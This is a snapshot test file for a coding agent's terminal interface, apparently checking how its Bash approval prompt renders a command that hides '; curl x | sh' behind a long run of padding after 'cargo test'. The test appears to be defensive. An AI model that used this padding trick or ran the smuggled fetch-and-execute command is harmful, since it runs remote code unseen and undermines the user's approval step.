@@ -1,0 +1,18 @@
+---
+source: crates/ox/src/tui/app/render.rs
+expression: "render_app(&mut app, 60, 14)"
+---
+"  ~/test │ main │ test-model (high) │ Ready                 "
+"────────────────────────────────────────────────────────────"
+"                                                            "
+"              ━━━━ oxide-code v0.0.0-test ━━━━              "
+"                                                            "
+"             test-model · high effort · API key             "
+"────────────────────────────────────────────────────────────"
+"Bash                                                        "
+"                                                            "
+"cargo                                                       "
+"  test······················································"
+"  ··························; curl x | sh                   "
+"                                                            "
+"[Y] approve   [N] deny   [F] feedback   [Esc] abort         "
